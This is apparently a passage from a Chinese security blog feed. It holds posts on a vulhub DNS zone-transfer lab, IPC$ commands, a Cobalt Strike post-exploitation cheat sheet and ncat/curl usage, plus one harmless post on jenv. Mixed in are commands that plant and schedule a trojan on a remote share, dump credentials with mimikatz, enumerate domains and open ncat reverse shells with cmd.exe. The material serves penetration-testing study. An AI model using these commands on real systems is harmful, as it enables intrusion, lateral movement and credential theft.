    <content type="html"><![CDATA[<p>vulhub学习DNS域传送漏洞</p><a id="more"></a><h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><h2 id="00-环境搭建"><a href="#00-环境搭建" class="headerlink" title="00 环境搭建"></a>00 环境搭建</h2><ul><li>docker路径 dns/dns-zone-transfer</li><li>启动 <ul><li>docker-compose build</li><li>docker-compose up -d</li></ul></li><li>关闭 docker-compose down</li></ul><p>环境运行后，将会监听TCP和UDP的53端口，DNS协议同时支持从这两个端口进行数据传输。因为涉及到1024以下的端口号，所以运行上述命令可能需要root权限</p><h2 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h2><p>DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库</p><p>DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者</p><p>常见DNS记录类型:</p><ul><li>A       IP地址记录,记录一个域名对应的IP地址</li><li>AAAA    IPv6 地址记录，记录一个域名对应的IPv6地址</li><li>CNAME   别名记录，记录一个主机的别名 </li><li>MX      电子邮件交换记录，记录一个邮件域名对应的IP地址，如<a href="mailto:root@xxxx.com">root@xxxx.com</a></li><li>NS      域名服务器记录 ,记录该域名由哪台域名服务器解析</li><li>PTR     反向记录，也即从IP地址到域名的一条记录</li><li>TXT     记录域名的相关文本信息</li><li>SOA记录   start of anthorization 开始授权，是一种比较难以理解的记录值，一般二级域名才会有</li></ul><h2 id="02-使用dig命令"><a href="#02-使用dig命令" class="headerlink" title="02 使用dig命令"></a>02 使用dig命令</h2><p><strong>1. dig @your-ip <a href="http://www.vulhub.org" target="_blank" rel="noopener">www.vulhub.org</a></strong></p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p><strong>2. 发送axfr类型的dns请求</strong></p><p><strong>dig @your-ip -t axfr <a href="http://www.vulhub.org" target="_blank" rel="noopener">www.vulhub.org</a></strong></p><p>axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录</p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p><h2 id="03-使用nmap"><a href="#03-使用nmap" class="headerlink" title="03 使用nmap"></a>03 使用nmap</h2><p>所用脚本：dns-zone-transfer.nse</p><p>参数设置：dns-zone-transfer.domain=vulhub.org</p><p>完整命令：nmap –script dns-zone-transfer.nse –script-args “dns-zone-transfer.domain=vulhub.org” -Pn -p 53 your-ip</p><p><img src="3.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>vulhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IPC连接常用命令</title>
    <link href="/IPC%E8%BF%9E%E6%8E%A5%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/IPC%E8%BF%9E%E6%8E%A5%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>IPC连接的一些整理</p><a id="more"></a><h1 id="IPC连接常用命令"><a href="#IPC连接常用命令" class="headerlink" title="IPC连接常用命令"></a>IPC连接常用命令</h1><h2 id="00-概念"><a href="#00-概念" class="headerlink" title="00 概念"></a>00 概念</h2><p>IPC是英文Internet Process Connection的缩写，可以理解为“命名管道”资源，它是Windows操作系统提供的一个通信基础，用来在两台计算机进程之间建立通信连接，而IPC后面的“$”是Windows系统所使用的隐藏符号，因此“IPC$”表示IPC共享，但是是隐藏的共享</p><p>IPC$是Windows NT及Windows 2000/XP/2003特有的一项功能，通过这项功能，一些网络程序的数据交换可以建立在IPC上面，实现远程访问和管理计算机</p><p>为了配合IPC共享工作，Windows操作系统（不包括Windows 98系列）在安装完成后，自动设置共享的目录为：C盘、D盘、E盘、ADMIN目录（C:\WINNT\）等，即为ADMIN$、C$、D$、E$等等，但要注意，这些共享是隐藏的，只有管理员能够对他们进行远程操作。在MS-DOS中键入“net share”命令来查看本机共享资源</p><h2 id="02-利用条件"><a href="#02-利用条件" class="headerlink" title="02 利用条件"></a>02 利用条件</h2><ol><li>开启了139，445端口</li><li>Windows NT及以上操作系统</li><li>得知目标的用户名和密码</li></ol><h2 id="03-操作命令"><a href="#03-操作命令" class="headerlink" title="03 操作命令"></a>03 操作命令</h2><ol><li><p>建立空连接</p><pre><code class="hljs shell">net use \\127.0.0.1\ipc$ "" /user:""</code></pre></li><li><p>建立完整连接</p><pre><code class="hljs shell">net use \\127.0.0.1\ipc$ "password" /user:"username"</code></pre></li><li><p>映射路径</p><pre><code class="hljs shell">net use z: \\127.0.0.1\c$ "密码" /user:"用户名"  (即可将对方的c盘映射为自己的z盘，其他盘类推)</code></pre></li><li><p>访问路径</p><pre><code class="hljs shell">net use z: \\127.0.0.1\c$   #直接访问</code></pre></li><li><p>删除路径</p><pre><code class="hljs shell">net use c: /del     删除映射的c盘，其他盘类推 net use * /del      删除全部,会有提示要求按y确认</code></pre></li><li><p>删除IPC$连接</p><pre><code class="hljs shell">net use \\127.0.0.1\ipc$ /del</code></pre></li><li><p>启动与关闭服务</p><pre><code class="hljs shell">net start //查看已经开启的服务net start servername //启动服务net stop servername//关闭服务</code></pre></li><li><p>启动与关闭共享</p><pre><code class="hljs shell">net shate ipc$ //开启ipc$默认共享net share ipc$ /del //关闭ipc$默认共享net share c=c:\ //完全共享c盘net share d=d:\ //删除完全共享的d盘</code></pre></li><li><p>复制远程文件</p><pre><code class="hljs shell">Copy e:\server.exe \\127.0.0.1\c$ \\将本地的E盘下的server.exe这个文件copy到对方系统的C盘根目录下</code></pre><p>Copy复制成功所需的条件：必须与主机建立ipc$连接</p></li><li><p>运行远程程序</p><pre><code class="hljs shell">At \\127.0.0.1 12:30 c:\server.exe \\让主机在中午12:30分运行我们已经复制到他C盘根目录下的木马server.exe</code></pre></li></ol><h2 id="04-错误代码"><a href="#04-错误代码" class="headerlink" title="04 错误代码"></a>04 错误代码</h2><ol><li>错误号5，拒绝访问 ： 很可能你使用的用户不是管理员权限的，先提升权限；</li><li>错误号51，Windows 无法找到网络路径 : 网络有问题； </li><li>错误号53，找不到网络路径 ： ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）</li><li>错误号67，找不到网络名 ： 你的lanmanworkstation服务未启动，目标删除了ipc$；</li><li>错误号1219，提供的凭据与已存在的凭据集冲突 ： 你已经和对方建立了一个ipc$，请删除再连</li><li>错误号1326，未知的用户名或错误密码 </li><li>错误号1792，试图登录，但是网络登录服务没有启动 ： 目标NetLogon服务未启动。（连接域控会出现此情况） </li><li>错误号2242，此用户的密码已经过期 ： 目标有帐号策略，强制定期要求更改密码。</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cobalt strike内网渗透常用命令</title>
    <link href="/cobalt-strike%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/cobalt-strike%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>域渗透、内网渗透的一些命令</p><a id="more"></a><h1 id="cobalt-strike内网渗透常用命令"><a href="#cobalt-strike内网渗透常用命令" class="headerlink" title="cobalt strike内网渗透常用命令"></a>cobalt strike内网渗透常用命令</h1><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf" target="_blank" rel="noopener">官方手册</a></p><h2 id="00-菜单功能"><a href="#00-菜单功能" class="headerlink" title="00 菜单功能"></a>00 菜单功能</h2><ul><li><p>cobalt strike</p><ul><li>New Connection  新的链接</li><li>Preferences 偏好设置</li><li>Visualization  窗口视图模式</li><li>VPN interfaces  VPN接入</li><li>Listeners  监听器</li><li>Sript Manager  脚本管理</li><li>Close 退出</li></ul></li><li><p>View：</p><ul><li>Applications 用于显示 System Profiler 获取的目标浏览器，操作系统，flash版本</li><li>Credentials 显示所有已经获取的用户主机hash</li><li>Downloads 显示下载的文件</li><li>Event log 事件日志 记录团队  目标上线等记录</li><li>Keystrokes 目标键盘记录</li><li>Proxy Pivots 代理信息</li><li>Screenshots 屏幕截图</li><li>Script Console 加载自定义脚本</li><li>Targets 显示所有主机</li><li>Web log web服务日志</li></ul></li><li><p>Attack：</p><ul><li>Packages<ul><li>HTML Application 生成hta文件</li><li>MS Office Macro  宏office文件</li><li>Payload Generator  生成各种语言版本的payload</li><li>USB/CD AutoPlay 利用自动播放运行的被控端文件</li><li>Windows Dropper 捆绑器可将任意正常的文件</li><li>Windows Executable payload生成可执行文件 (一般使用这个)</li><li>Windows Executable (S)  把包含payload,Stageless生成可执行文件(包含多数功能)</li></ul></li><li>Web Drive-by：<ul><li>Manage  开启的所有web服务</li><li>Clone Site 克隆网站 </li><li>Host File 提供Web以供下载某文件</li><li>Scripted Web Delivery  为payload提供web服务以便于下载和执行</li><li>Signed Applet Attack  启动一个Web服务以提供自签名Java Applet的运行环境</li><li>Smart Applet Attack  自动检测Java版本并l利用已知的exploits绕过security</li><li>System Profiler 获取系统，Flash，浏览器版本等</li></ul></li></ul></li><li><p>spear phishing 鱼叉式网络钓鱼</p></li><li><p>Reporting：</p><ul><li>Activity report  活动报告</li><li>Hosts report  主机报告</li><li>Indicators of Compromise 威胁报告</li><li>Sessions report  会话报告</li><li>Social engineering report  社会工程学报告</li></ul></li></ul><h2 id="01-右键功能"><a href="#01-右键功能" class="headerlink" title="01 右键功能"></a>01 右键功能</h2><ul><li><p>Interact 打开beacon</p></li><li><p>Access </p><ul><li>dump hashes 获取hash</li><li>Elevate  提权</li><li>Golden Ticket 生成黄金票据注入当前会话</li><li>MAke token  凭证转换</li><li>Run Mimikatz 运行 Mimikatz </li><li>Spawn As 用其他用户生成Cobalt Strike侦听器</li></ul></li><li><p>Explore</p><ul><li>Browser Pivot 劫持目标浏览器进程</li><li>Desktop(VNC)  桌面交互</li><li>File Browser  文件浏览器</li><li>Net View 命令Net View</li><li>Port scan 端口扫描</li><li>Process list 进程列表</li><li>Screenshot 截图</li></ul></li><li><p>Pivoting</p><ul><li><p>SOCKS Server 代理服务</p></li><li><p>Listener  反向端口转发</p></li><li><p>Deploy VPN 部署VPN</p></li></ul></li><li><p>Spawn  新的通讯模式并生成会话</p></li><li><p>Session 会话管理，删除，心跳时间，退出，备注</p></li></ul><h2 id="02-beacon命令"><a href="#02-beacon命令" class="headerlink" title="02 beacon命令"></a>02 beacon命令</h2><ul><li><p>argue            进程参数欺骗</p></li><li><p>browserpivot        注入受害者浏览器进程</p></li><li><p>bypassuac         绕过UAC</p></li><li><p>cancel           取消正在进行的下载</p></li><li><p>cd             切换目录</p></li><li><p>checkin          强制让被控端回连一次</p></li><li><p>clear           清除beacon内部的任务队列</p></li><li><p>connect          Connect to a Beacon peerover TCP</p></li><li><p>covertvpn         部署Covert VPN客户端</p></li><li><p>cp             复制文件</p></li><li><p>dcsync           从DC中提取密码哈希</p></li><li><p>desktop          远程VNC</p></li><li><p>dllinject         反射DLL注入进程</p></li><li><p>dllload          使用LoadLibrary将DLL加载到进程中</p></li><li><p>download          下载文件</p></li><li><p>downloads         列出正在进行的文件下载</p></li><li><p>drives           列出目标盘符</p></li><li><p>elevate          尝试提权</p></li><li><p>execute          在目标上执行程序(无输出)</p></li><li><p>execute-assembly      在目标上内存中执行本地.NET程序</p></li><li><p>exit            退出beacon</p></li><li><p>getprivs          Enable system privileges oncurrent token</p></li><li><p>getsystem         尝试获取SYSTEM权限</p></li><li><p>getuid           获取用户ID</p></li><li><p>hashdump          转储密码哈希值</p></li><li><p>help            帮助</p></li><li><p>inject           在特定进程中生成会话</p></li><li><p>jobkill          杀死一个后台任务</p></li><li><p>jobs            列出后台任务</p></li><li><p>kerberos_ccache_use    从ccache文件中导入票据应用于此会话</p></li><li><p>kerberos_ticket_purge   清除当前会话的票据</p></li><li><p>kerberos_ticket_use    从ticket文件中导入票据应用于此会话</p></li><li><p>keylogger         键盘记录</p></li><li><p>kill            结束进程</p></li><li><p>link            Connect to a Beacon peerover a named pipe</p></li><li><p>logonpasswords       使用mimikatz转储凭据和哈希值</p></li><li><p>ls             列出文件</p></li><li><p>make_token         创建令牌以传递凭据</p></li><li><p>mimikatz          运行mimikatz</p></li><li><p>mkdir           创建一个目录</p></li><li><p>mode dns          使用DNS A作为通信通道(仅限DNS beacon)</p></li><li><p>mode dns-txt        使用DNS TXT作为通信通道(仅限D beacon)</p></li><li><p>mode dns6         使用DNS AAAA作为通信通道(仅限DNS beacon)</p></li><li><p>mode http         使用HTTP作为通信通道</p></li><li><p>mv             移动文件</p></li><li><p>net            net命令</p></li><li><p>note            备注    </p></li><li><p>portscan          进行端口扫描</p></li><li><p>powerpick         通过Unmanaged PowerShell执行命令</p></li><li><p>powershell         通过powershell.exe执行命令</p></li><li><p>powershell-import     导入powershell脚本</p></li><li><p>ppid            Set parent PID forspawned post-ex jobs</p></li><li><p>ps             显示进程列表</p></li><li><p>psexec           Use a service to spawn asession on a host</p></li><li><p>psexec_psh         Use PowerShell to spawn asession on a host</p></li><li><p>psinject          在特定进程中执行PowerShell命令</p></li><li><p>pth            使用Mimikatz进行传递哈希</p></li><li><p>pwd            当前目录位置</p></li><li><p>reg            Query the registry</p></li><li><p>rev2self          恢复原始令牌</p></li><li><p>rm             删除文件或文件夹</p></li><li><p>rportfwd          端口转发</p></li><li><p>run            在目标上执行程序(返回输出)</p></li><li><p>runas           以另一个用户权限执行程序</p></li><li><p>runasadmin         在高权限下执行程序</p></li><li><p>runu            Execute a program underanother PID</p></li><li><p>screenshot         屏幕截图</p></li><li><p>setenv           设置环境变量</p></li><li><p>shell           cmd执行命令</p></li><li><p>shinject          将shellcode注入进程</p></li><li><p>shspawn          生成进程并将shellcode注入其中</p></li><li><p>sleep           设置睡眠延迟时间</p></li><li><p>socks           启动SOCKS4代理</p></li><li><p>socks stop         停止SOCKS4</p></li><li><p>spawn           Spawn a session</p></li><li><p>spawnas          Spawn a session as anotheruser</p></li><li><p>spawnto          Set executable tospawn processes into</p></li><li><p>spawnu           Spawn a session underanother PID</p></li><li><p>ssh            使用ssh连接远程主机</p></li><li><p>ssh-key          使用密钥连接远程主机</p></li><li><p>steal_token        从进程中窃取令牌</p></li><li><p>timestomp         将一个文件时间戳应用到另一个文件</p></li><li><p>unlink           Disconnect from parentBeacon</p></li><li><p>upload           上传文件</p></li><li><p>wdigest          使用mimikatz转储明文凭据</p></li><li><p>winrm           使用WinRM在主机上生成会话</p></li><li><p>wmi            使用WMI在主机上生成会话</p></li></ul><h2 id="03-内网渗透常用命令"><a href="#03-内网渗透常用命令" class="headerlink" title="03 内网渗透常用命令"></a>03 内网渗透常用命令</h2><p><a href="https://www.t00ls.net/articles-39285.html" target="_blank" rel="noopener">参考</a></p><ul><li><p>ipconfig/all  //查看IP地址</p></li><li><p>ipconfig /release //释放地址</p></li><li><p>ipconfig /renew 重新获取Ip地址</p></li><li><p>whoami  //查询账号所属权限</p></li><li><p>whoami/all //查看sid值</p></li><li><p>systeminfo //查询系统以及补丁信息</p></li><li><p>tasklist /svc  //查看进程</p></li><li><p>taskkill /im 进程名称(cmd) //结束进程</p></li><li><p>taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)</p></li><li><p>wmic qfe get hotfixid  //查看已安装过得补丁，这个很实用</p></li><li><p>wmic qfe list full /format:htable &gt; hotfixes.htm //详细的补丁安装</p></li><li><p>wmic qfe    //查询补丁信息以及微软提供的下载地址</p></li><li><p>ping hostname(主机名）  //显示该机器名的IP</p></li><li><p>net start  //查看当前运行的服务</p></li><li><p>net user    //查看本地组的用户</p></li><li><p>net localgroup administrators  //查看本机管理员组有哪些用户</p></li><li><p>net use    //查看会话</p></li><li><p>net session   //查看当前会话</p></li><li><p>net share    //查看SMB指向的路径[即共享]</p></li><li><p>wmic share get name,path  //查看SMB指向的路径</p></li><li><p>wmic nteventlog get path,filename,writeable //查询系统日志文件存储位置</p></li><li><p>net use \IP\ipc$ password /user:username    //建立IPC会话（工作组模式）</p></li><li><p>net use z: \192.168.1.1    //建立映射到本机Z盘</p></li><li><p>net time \172.16.16.2     //查询共享主机的是</p></li><li><p>at \172.16.16.2 13:50 c:\windows\2009.exe    //在共享主机上执行</p></li><li><p>netstat -ano    //查看开放的端口</p></li><li><p>netstat -an | find “3389”  //找到3389端口</p></li><li><p>net accounts    //查看本地密码策略</p></li><li><p>nbtstat –A ip    //netbiso查询</p></li><li><p>net view    //查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来</p></li><li><p>echo %PROCESSOR_ARCHITECTURE%     //查看系统是32还是64位 </p></li><li><p>set                    //查看系统环境设置变量</p></li><li><p>net start              //查看当前运行的服务</p></li><li><p>wmic service list brief        //查看进程服务</p></li><li><p>wmic process list brief      //查看进程</p></li><li><p>wmic startup list brief    //查看启动程序信息</p></li><li><p>wmic product list brief       //查看安装程序和版本信息（漏洞利用线索）</p></li><li><p>wmic startup list full      //识别开机启动的程序</p></li><li><p>wmic process where(description=”mysqld.exe”) &gt;&gt;mysql.log //获取软件安装路径</p></li></ul><h2 id="04-域渗透常用命令"><a href="#04-域渗透常用命令" class="headerlink" title="04 域渗透常用命令"></a>04 域渗透常用命令</h2><ul><li><p>net group /domain               //获得所有域用户组列表</p></li><li><p>net group qq_group /domain         //显示域中qq_group组的成员</p></li><li><p>net group qq_group /del /domain      //删除域中qq_group组</p></li><li><p>net group qq_group qq /del /domain    //删除域内qq_group 群组中的成员QQ</p></li><li><p>net group qq_group /add /domain      //增加域中的群组</p></li><li><p>net group “domain admins” /domain    //获得域管理员列表</p></li><li><p>net group “enterprise admins” /domain  //获得企业管理员列表</p></li><li><p>net localgroup administrators /domain  //获取域内置administrators组用（enterprise admins、domain admins）</p></li><li><p>net group “domain controllers” /domain  //获得域控制器列表</p></li><li><p>net group “domain computers” /domain  //获得所有域成员计算机列表</p></li><li><p>net user /domain               //获得所有域用户列表</p></li><li><p>net user someuser /domain         //获得指定账户someuser的详细信息</p></li><li><p>net accounts /domain          //获得域密码策略设置，密码长短，错误锁定等信息</p></li><li><p>net view /domain            //查询有几个域, 查询域列表</p></li><li><p>net view /domain:testdomain    //查看 testdomain域中的计算机列表</p></li><li><p>nltest /domain_trusts        //获取域信任信息</p></li><li><p>net user domain-admin /domain   //查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息</p></li><li><p>net config Workstation      //查询机器属于哪个域</p></li><li><p>net time /domian          //查询主域服务器的时间</p></li><li><p>echo %logonserver%         //查看登陆到这台服务器的计算机名</p></li><li><p>net time \192.168.1.1      //查询远程共享主机192.168.1.1的时间</p></li><li><p>net use \IP\ipc$ password /user:username@domain   //ipc$域内连接</p></li><li><p>net view \dc2.backlion.com      //查看域控共享情况</p></li><li><p>dir \dc2.backlion.com\SYSVOL /s /a &gt; sysvol.txt //列出sysvol日志记录</p></li><li><p>xcopy \dc2.backlion.com\sysvol.txt sysvol.txt /i /e /c//远程拷贝到本地sysvol日志</p></li><li><p>net user /domain bk bk123           //修改域内用户密码，需要管理员权限</p></li><li><p>net localgroup administartors  SEZKL\backlion /add   //将SEZKL域中的用户backlion添加到administrators组中</p></li><li><p>mstsc /admin           //远程桌面登录到console会话解决hash无法抓出问题</p></li><li><p>gpupdate/force            //更新域策略</p></li><li><p>psexec \192.168.1.3 -u administrator -p bk1234 -c gsecdump.exe -u</p><p>//从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</p></li><li><p>gsecdump -a     //获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</p></li><li><p>tasklist /S ip /U domain\username /P /V  //查看远程计算机进程列</p></li></ul><h2 id="05-dsquery的AD查询工具"><a href="#05-dsquery的AD查询工具" class="headerlink" title="05 dsquery的AD查询工具"></a>05 dsquery的AD查询工具</h2><ul><li><p>dsquery user domainroot -limit 65535 &amp;&amp; net user /domain  //列出该域内所有用户名</p></li><li><p>dsquery server -domain super.com | dsget server -dnsname -site  //搜索域内所有域控制器并显示他们的DNS主机名和站点名称</p></li><li><p>dsquery contact  //寻找目录中的联系人</p></li><li><p>dsquery subnet   //列出该域内网段划分</p></li><li><p>query user        //查询那些用户在线</p></li><li><p>dsquery group &amp;&amp; net group /domain   //列出该域内分组</p></li><li><p>dsquery ou                   //列出该域内组织单位</p></li><li><p>dsquery server &amp;&amp; net time /domain    //列出该域内域控制器</p></li><li><p>dsquery site -o rdn           //搜索域中所有站点的名称</p></li><li><p>dsquery group dc=super,dc=com |more  //搜索在DC=SUPER,DC=COM 域中的所有组</p></li><li><p>psloggedon.exe                //查询那台主机和用户登录到该主机上</p></li><li><p>netsess.exe  //192.168.1.115      //远程主机上无需管理员权限,查询到主机名和用户</p></li><li><p>reg query “HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT” //获取最近mstsc登录的记录</p></li></ul><h2 id="06-CS与MSF互转"><a href="#06-CS与MSF互转" class="headerlink" title="06 CS与MSF互转"></a>06 CS与MSF互转</h2><ul><li><p>CS到MSF</p><ul><li><p>在CS中获取一个beacon</p></li><li><p>在msf中设置监听</p><pre><code class="hljs gams">use exploit/multi/handler<span class="hljs-keyword">set</span> padyload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost xx.xx.xx.xx</span><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 1234</span>run</code></pre></li><li><p>在CS中设置一个监听器</p><p>windows/foreign/reverse_tcp Listener</p><p>其中ip为msf的ip地址，端口为msf所监听的端口</p></li><li><p>右键spawn，选择刚才设置的监听器即可</p></li></ul></li><li><p>MSF到CS</p><ul><li><p>在MSF中获取一个Meterpreter</p></li><li><p>在CS中设置一个监听</p></li><li><p>在MSF中进行注入，注意payload要与CS监听使用的payload一致</p><pre><code class="hljs routeros">msf exploit(handler) &gt;  use exploit/windows/local/payload_inject msf exploit(payload_inject) &gt;  <span class="hljs-builtin-name">set</span> PAYLOAD windows/meterpreter/reverse_http msf exploit(payload_inject) &gt; <span class="hljs-builtin-name">set</span> DisablePayloadHandler <span class="hljs-literal">true</span> msf exploit(payload_inject) &gt; <span class="hljs-builtin-name">set</span> LHOST xx.xx.xx.xx msf exploit(payload_inject) &gt; <span class="hljs-builtin-name">set</span> LPORT 1234msf exploit(payload_inject) &gt; <span class="hljs-builtin-name">set</span> SESSION 1 msf exploit(payload_inject) &gt; exploit</code></pre></li><li><p>主机上线</p></li></ul></li></ul><h2 id="07-键盘快捷键"><a href="#07-键盘快捷键" class="headerlink" title="07 键盘快捷键"></a>07 键盘快捷键</h2><p>摘自<a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf" target="_blank" rel="noopener">官方文档</a></p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用jenv管理JDK版本</title>
    <link href="/%E4%BD%BF%E7%94%A8jenv%E7%AE%A1%E7%90%86JDK%E7%89%88%E6%9C%AC/"/>
    <url>/%E4%BD%BF%E7%94%A8jenv%E7%AE%A1%E7%90%86JDK%E7%89%88%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p>JDK版本切换确实是件头疼的事</p><a id="more"></a><h1 id="使用jenv管理JDK版本"><a href="#使用jenv管理JDK版本" class="headerlink" title="使用jenv管理JDK版本"></a>使用jenv管理JDK版本</h1><ol><li><p>使用Homebrew下载</p><pre><code class="hljs shell">brew install jenv</code></pre></li><li><p>安装之后的配置</p><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> 'export PATH=<span class="hljs-string">"$HOME/.jenv/bin:$PATH"</span>' &gt;&gt; ~<span class="hljs-string">/.bash_profile</span><span class="hljs-keyword">echo</span> 'eval <span class="hljs-string">"$(jenv init -)"</span>' &gt;&gt; ~<span class="hljs-string">/.bash_profile</span></code></pre><p>使配置生效</p><pre><code class="hljs bash"><span class="hljs-built_in">source</span> .bash_profile</code></pre></li><li><p>使用命令 jenv versions 可以查看当前所有版本</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p>如图安装有1.8、11、openjdk几个版本，当前使用的是1.8</p></li><li><p>查看所有JDK的目录</p><pre><code class="hljs awk">cd <span class="hljs-regexp">/Library/</span>Java<span class="hljs-regexp">/JavaVirtualMachines/</span></code></pre><p><img src="2.png" srcset="/img/loading.gif" alt=""></p><p>如图有8、11、12三个目录</p></li><li><p>添加JDK到jenv中</p><pre><code class="hljs awk">jenv add <span class="hljs-regexp">/System/</span>Library<span class="hljs-regexp">/Java/</span>JavaVirtualMachines<span class="hljs-regexp">/要添加的JDK/</span>Contents<span class="hljs-regexp">/Home/</span></code></pre><p>根据要添加的JDK版本补全以上命令并执行</p></li><li><p>切换JDK版本</p><p>查看当前java版本</p><pre><code class="hljs applescript">java -<span class="hljs-built_in">version</span></code></pre><p><img src="3.png" srcset="/img/loading.gif" alt=""></p><p>当前为1.8版本</p><p>切换到11版本</p><pre><code class="hljs angelscript">jenv local <span class="hljs-number">11</span></code></pre><p>再次查看，发现已经切换成功了</p><p><img src="4.png" srcset="/img/loading.gif" alt=""></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>几个网络相关的小工具</title>
    <link href="/%E5%87%A0%E4%B8%AA%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9A%84%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    <url>/%E5%87%A0%E4%B8%AA%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9A%84%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<p>ncat、curl、lcx、netstat、tcpdump</p><a id="more"></a><h1 id="几个网络相关的小工具"><a href="#几个网络相关的小工具" class="headerlink" title="几个网络相关的小工具"></a>几个网络相关的小工具</h1><h2 id="00-ncat"><a href="#00-ncat" class="headerlink" title="00 ncat"></a>00 ncat</h2><ol><li><p>监听某一端口<br>ncat -l port</p></li><li><p>连接远程端口<br>ncat ip port</p><p>默认情况下只会连接TCP端口</p><p>可以开启两个终端，一边监听一边连接，实现消息发送</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p></li><li><p>监听UDP端口<br>ncat -l -u port</p></li><li><p>连接远程UDP端口<br>ncat -u ip port</p></li><li><p>单向代理<br>ncat -l port1 | ncat ip2 port2</p><p>监听本地的port1端口，将port1端口的流量转发到ip2的port2端口</p><p>只能发送数据，无法接收返回的数据</p></li><li><p>双向代理 </p><p>mkfifo 2way</p><p>ncat -l port1 0&lt;2way | ncat ip2 port2 1&gt;2way </p><p>能发送数据，也能接收返回的数据</p></li><li><p>端口转发<br>ncat -u -l  port1 -c  ‘ncat -u -l port2’<br>将port1端口的流量转发给port2</p></li><li><p>反弹shell</p><ul><li><p>肉鸡监听端口，本机连接</p><p>肉鸡执行：ncat -l -p port -t -e cmd.exe</p><p>本机执行：ncat -nvv 肉鸡IP port</p></li><li><p>本机监听端口，肉鸡连接</p><p>本机执行：ncat -l -p port</p><p>肉鸡执行：ncat -t -e cmd.exe IP port </p><p>-t 表示通过Telnet模式执行</p></li></ul></li></ol><h2 id="01-curl"><a href="#01-curl" class="headerlink" title="01 curl"></a>01 curl</h2><p>参考 <a href="http://www.ruanyifeng.com/blog/2011/09/curl.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2011/09/curl.html</a> 与 <a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html" target="_blank" rel="noopener">https://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></p><ol><li><p>获取页面</p><p>curl <a href="https://www.example.com" target="_blank" rel="noopener">https://www.example.com</a></p><p>直接发送GET请求，会输出网站源码</p><p><img src="3.png" srcset="/img/loading.gif" alt=""></p><ul><li><p>用-o参数保存</p><p>curl -o example.html <a href="https://www.example.com" target="_blank" rel="noopener">https://www.example.com</a></p></li><li><p>用-O参数保存</p></li><li><p>curl -O <a href="https://www.example.com/example.html" target="_blank" rel="noopener">https://www.example.com/example.html</a></p></li></ul></li><li><p>获取HTTP响应头和页面</p><p>curl -i <a href="https://www.example.com" target="_blank" rel="noopener">https://www.example.com</a></p><p>返回HTTP响应头和源码</p><p><img src="4.png" srcset="/img/loading.gif" alt=""></p></li><li><p>获取连接过程、HTTP请求头、HTTP响应头和页面</p><p>curl -v <a href="https://www.example.com" target="_blank" rel="noopener">https://www.example.com</a></p><p><img src="5.png" srcset="/img/loading.gif" alt=""></p></li><li><p>设置请求方式</p><p>默认为GET请求，可以设置其他请求方式</p><ul><li>curl -X POST <a href="https://www.example.com" target="_blank" rel="noopener">https://www.example.com</a></li></ul></li></ol><ul><li>curl -X DELETE <a href="https://www.example.com" target="_blank" rel="noopener">https://www.example.com</a><ul><li>-I / –head 